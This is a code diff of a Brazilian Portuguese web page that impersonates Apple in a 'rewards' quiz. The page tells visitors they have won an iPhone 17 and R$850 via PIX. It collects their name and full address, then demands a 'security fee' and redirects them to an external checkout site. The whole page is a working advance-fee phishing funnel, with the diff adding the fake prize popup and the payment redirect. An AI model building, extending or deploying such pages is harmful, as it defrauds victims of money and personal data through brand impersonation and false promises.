@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Apple Rewards</title>
@@ -435,14 +437,14 @@
 <body>
 
 <audio id="coinSound">
-    <source src="media/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
+    <source src="https://assets.mixkit.co/sfx/preview/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
 </audio>
 
 <div class="container" id="quizContainer">
 
     <div class="topbar">
         <div class="logo">
-            <img src="images/Apple_logo_black.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
             Apple
         </div>
 
@@ -474,7 +476,7 @@
 
     <div class="topbar">
         <div class="logo">
-            <img src="images/Apple_logo_black.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
             Apple
         </div>
 
@@ -511,7 +513,7 @@
 
 <div class="taxa-container" id="taxaContainer">
     <div class="taxa-header">
-        <img src="images/Apple_logo_black.svg" class="taxa-logo-apple">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="taxa-logo-apple">
         
         <svg xmlns="http://www.w3.org/2000/svg" class="taxa-icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
             <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
@@ -583,22 +585,22 @@
 
     <form class="envio-form">
         <label for="nomeCompleto">Nome Completo</label>
-        <input type="text" id="nomeCompleto" placeholder="Seu nome" required="">
+        <input type="text" id="nomeCompleto" placeholder="Seu nome" required>
 
         <label for="cep">CEP</label>
-        <input type="text" id="cep" placeholder="00000-000" required="">
+        <input type="text" id="cep" placeholder="00000-000" required>
 
         <label for="endereco">Endereço (Rua/Avenida, Número)</label>
-        <input type="text" id="endereco" placeholder="Ex: Rua das Maçãs, 100" required="">
+        <input type="text" id="endereco" placeholder="Ex: Rua das Maçãs, 100" required>
 
         <label for="bairro">Bairro</label>
-        <input type="text" id="bairro" placeholder="Ex: Centro" required="">
+        <input type="text" id="bairro" placeholder="Ex: Centro" required>
 
         <label for="cidade">Cidade</label>
-        <input type="text" id="cidade" placeholder="Ex: São Paulo" required="">
+        <input type="text" id="cidade" placeholder="Ex: São Paulo" required>
 
         <label for="estado">Estado (UF)</label>
-        <input type="text" id="estado" placeholder="Ex: SP" required="">
+        <input type="text" id="estado" placeholder="Ex: SP" required>
 
         <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENVIO E RECEBER PIX</button>
     </form>
@@ -624,7 +626,24 @@
     </div>
 </div>
 
-    <script>
+<div class="popup" id="popupConquista">
+    <div class="popup-box" style="max-width:400px;border-radius:25px;padding:30px;background:#fefefe;">
+        <h3 style="font-size:24px;font-weight:700;color:#1c1c1c;margin-bottom:15px;">🎉 Parabéns pela sua conquista!</h3>
+        <p style="font-size:16px;color:#333;margin-bottom:15px;line-height:1.5;">
+            Você acaba de ganhar um <strong>iPhone 17</strong> e <strong>R$850,00</strong> na sua chave PIX.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:20px;line-height:1.5;">
+            Nossa equipe de logística já está preparando seu iPhone, e o envio para o seu endereço será realizado em breve.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:25px;line-height:1.5;">
+            Para receber seu PIX, basta clicar no botão abaixo e efetuar a taxa de segurança. Isso garante que a chave PIX fornecida realmente seja sua, validando seu recebimento imediato.
+        </p>
+        <button class="popup-btn" id="btnConquista" style="background:#0071e3;color:#fff;font-size:16px;font-weight:700;padding:16px;border-radius:14px;cursor:pointer;border:none;width:100%;">
+            Receber Recompensa Agora
+        </button>
+    </div>
+</div>
+<script>
 const coinSound = document.getElementById("coinSound");
 
 const perguntas = [
@@ -675,11 +694,16 @@ const progressBar = document.getElementById("progressBar");
 const btnSaque = document.getElementById("btnSaque");
 const resgateContainer = document.getElementById("resgateContainer");
 const taxaContainer = document.getElementById("taxaContainer");
-const envioContainer = document.getElementById("envioContainer"); // Nova Tela Adicionada
+const envioContainer = document.getElementById("envioContainer"); 
 const quizContainer = document.getElementById("quizContainer"); 
 
 const btnTaxaSacar = document.getElementById("btnTaxaSacar"); // Botão "REALIZAR SAQUE" da tela de taxa
-const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da nova tela de envio
+const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da tela de envio
+
+// NOVO: Variáveis para o Pop-up de Conquista
+const popupConquista = document.getElementById("popupConquista");
+const btnConquista = document.getElementById("btnConquista");
+
 
 function atualizarProgresso() {
     const progresso = ((etapa) / perguntas.length) * 100;
@@ -699,6 +723,7 @@ function carregarPergunta() {
     title.innerText = q.titulo;
     optionsBox.innerHTML = "";
     selected = false;
+    btn.classList.remove("enabled"); // Garante que o botão comece desabilitado
 
     q.opcoes.forEach(op => {
         const div = document.createElement("div");
@@ -774,28 +799,28 @@ btnSaque.onclick = () => {
     taxaContainer.style.display = "block";
 };
 
-// 2. Botão da Tela de Taxa -> Tela de Envio (Nova Lógica)
+// 2. Botão da Tela de Taxa -> Tela de Envio
 btnTaxaSacar.onclick = () => {
-    // AQUI é o ponto onde o usuário teoricamente pagaria a taxa
-    // Simulando que o pagamento foi concluído, avança para a tela de envio
+    // Avança para a tela de envio (após o suposto pagamento)
     taxaContainer.style.display = "none";
     envioContainer.style.display = "block";
-
-    // Na implementação real, aqui seria o redirecionamento para o checkout
-    // window.location.href = "SEU_LINK_DE_PAGAMENTO_AQUI"; 
 };
 
-// 3. Botão da Tela de Envio -> Próxima Ação (Ex: Página de Obrigado/Confirmação Final)
+// 3. NOVO: Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
 btnFinalizarEnvio.onclick = () => {
-    // Esta função será chamada ao clicar no botão da tela de envio
-    alert("Dados de envio cadastrados com sucesso! Agora, o PIX e o iPhone serão processados.");
-    // Aqui você colocaria o código para redirecionar para a última página do funil (obrigado)
-    // window.location.href = "PAGINA_DE_OBRIGADO_AQUI"; 
+    // Oculta a tela de envio e mostra o novo pop-up (conforme solicitado)
+    envioContainer.style.display = "none";
+    popupConquista.style.display = "flex";
+};
+
+// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento Final
+btnConquista.onclick = () => {
+    // Redireciona para o link fornecido após o clique no pop-up
+    window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
 };
 
 carregarPergunta();
 </script>
 
-
-
-</body></html>
+</body>
+</html>
